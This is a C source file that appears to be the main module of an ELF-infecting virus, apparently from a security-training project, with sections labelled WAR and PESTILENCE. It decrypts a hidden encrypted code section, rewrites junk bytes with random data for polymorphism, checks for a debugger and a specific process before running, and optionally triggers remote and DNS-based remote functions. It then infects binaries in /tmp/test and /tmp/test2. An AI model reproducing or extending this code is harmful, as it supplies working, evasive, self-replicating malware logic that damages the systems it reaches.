#include <elf.h>
#include "infect.h"
#include "ft_lib.h"
#include "hacks.h"
#include "pos.h"
#include "table.h"

int __attribute__((section (".textearly"))) main(int ac, char **av) asm ("entry");

extern struct s_opt opt;

extern char test_area;
extern char   key[16];

//======================== WAR ===============================

unsigned int ft_rand(){
	uint32_t		u;
	int             fd;

	if ((fd = ft_open("/dev/urandom", 0, 0)) == -1)
		return FALSE;
	ft_read(fd, &u, sizeof(u));
	ft_close(fd);
	return u;
}

int _replace_jmp_gb(Garbage g){
	if (&bin_start + g.off + g.len >= &bin_end) return FALSE;

	unsigned char *p = ((unsigned char *)(&bin_start)) + g.off + 2;
	int n = g.len - 2;
	for (int i = 0; i < n; i++){
		p[i] = (unsigned char)ft_rand();
	}
	return TRUE;
}

void change_garbage_code(){
	//print("now: ");printnbln(garbage_table_len);
	for (int i = 0 ; i < garbage_table_len; i++){
		_replace_jmp_gb(garbage_table[i]);
	}
}

//======================= PESTILENCE =========================

extern void decrypt_block_asm(uint32_t *v, uint32_t *k);

int decryptHiddenCode(){
	char *s = ((char*)&crypt_start);
	uint64_t n = ((size_t)&crypt_end) - ((size_t)&crypt_start);

	decrypt(s,n,(uint32_t*)key);
	//decrypt test area
	decrypt(&test_area,15,(uint32_t*)key);
	//check test area
	for (int i = 0; i < n; i++)
		if ((&test_area)[i] != 'A')
			return FALSE;
	
	return TRUE;
}

//=============================================================

void do_infection(){
        char *virus = (char *)&bin_start;
        size_t virus_len = ((size_t)&bin_end) - ((size_t)&bin_start);
        size_t crypt_off = ((size_t)&crypt_start) - ((size_t)&bin_start);
        size_t crypt_len = ((size_t)&crypt_end) - ((size_t)&crypt_start);

	infect_dir("/tmp/test", virus, virus_len, crypt_off, crypt_len, opt);
	infect_dir("/tmp/test2", virus, virus_len, crypt_off, crypt_len, opt);
}

int virus(int ac, char **av){
	if (opt.do_remote) remote();
	if (opt.do_dns_remote)
		dns_remote();
 	if (opt.print_msg) println("[I am a bad virus]");

	change_garbage_code();
	do_infection();
	return TRUE;
}

int main(int ac, char **av){
	char cmp[5];
	cmp[0] = 't';
	cmp[1] = 'e';
	cmp[2] = 's';
	cmp[3] = 't';
	cmp[4] = '\0';
	if (checkproc(cmp) == FALSE)
		return FALSE;
	if (checkdebug() == 0)
	{
		return decryptHiddenCode() && virus(ac, av);
	}
	else
		CALL(SYS_write, 1, "DEBUGGING..\n", 12);
	return (0);
}
